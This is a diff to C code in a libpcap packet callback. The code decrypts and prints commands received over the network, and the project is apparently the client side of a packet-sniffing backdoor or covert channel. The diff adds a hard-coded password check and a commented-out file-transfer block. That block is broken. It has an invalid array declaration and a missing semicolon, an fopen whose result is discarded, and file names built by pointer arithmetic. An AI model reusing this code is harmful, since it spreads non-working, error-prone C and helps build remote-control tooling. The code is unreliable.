@@ -185,8 +185,37 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		free(decrypted);
 		return;
 	}
-	else if (mode == CLIENT_MODE)
+	else if (mode == CLIENT_MODE && (strcmp(password, PASSWORD) == 0))
 	{
+		char[256] fileName;
+		int packetMode;
+		int transferMode;
+		//packetMode= atoi(command[0]);
+		/*if (packetMode == TRANSFER_MODE){
+			strncpy(fileName,command+4, 255);
+			char* end = strstr(fileName, " ")
+			end[0] = '\0';
+			transferMode = atoi(command[2]);
+			if (transferMode == CREATE_MODE){
+			 	if( (_access( fileName, 0 )) != -1 ) {
+			 		int count=0;
+			 		while((_access( fileName + count, 0 )) != -1){
+			 			count++;
+			 		}
+					//rename(backup) old file
+					rename(fileName, fileName+count);
+					//create empty file
+					
+				}
+				
+			}
+			//open file and append payload data to file
+			fopen(fileName, "a+");
+			
+		} else{// is command output
+			//print command results to stdout
+			printf("%s\n", command);
+		}*/
 		printf("%s\n", command);
 		free(command);
 		free(decrypted);
